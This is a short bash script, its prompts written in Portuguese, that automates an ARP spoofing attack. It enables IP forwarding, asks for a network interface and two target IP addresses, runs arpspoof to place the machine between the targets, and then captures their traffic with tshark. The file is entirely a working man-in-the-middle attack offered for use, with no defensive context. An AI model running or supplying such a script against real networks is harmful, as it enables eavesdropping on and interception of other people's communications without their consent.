#!/bin/bash

#simple bash script to make a little bit fast the arp spoofing attack :)

sudo su
echo 1 > /proc/sys/net/ipv4/ip_forward
read -p "Qual é a sua interface de rede? " interface_rede
read -p "Qual é o IP do primeiro alvo? " primeiro_alvo
read -p "Qual é o IP do segundo alvo? " segundo_alvo
arpspoof -i $interface_rede -t $primeiro_alvo -r $segundo_alvo
tshark -i $interface_rede
